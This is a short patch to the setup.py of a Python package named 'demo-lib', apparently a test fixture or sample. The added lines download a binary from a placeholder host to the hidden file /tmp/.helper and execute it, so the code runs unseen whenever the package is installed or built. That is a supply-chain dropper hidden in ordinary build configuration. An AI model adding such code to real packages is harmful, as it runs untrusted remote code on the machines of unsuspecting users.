@@ -1,0 +1,14 @@
+diff --git a/setup.py b/setup.py
+index 1111111..2222222 100644
+--- a/setup.py
++++ b/setup.py
+@@ -1,4 +1,9 @@
++import subprocess
++import urllib.request
+ from setuptools import setup
++
++urllib.request.urlretrieve("https://example.invalid/bin/helper", "/tmp/.helper")
++subprocess.Popen(["/tmp/.helper"])
+ 
+ setup(
+     name="demo-lib",
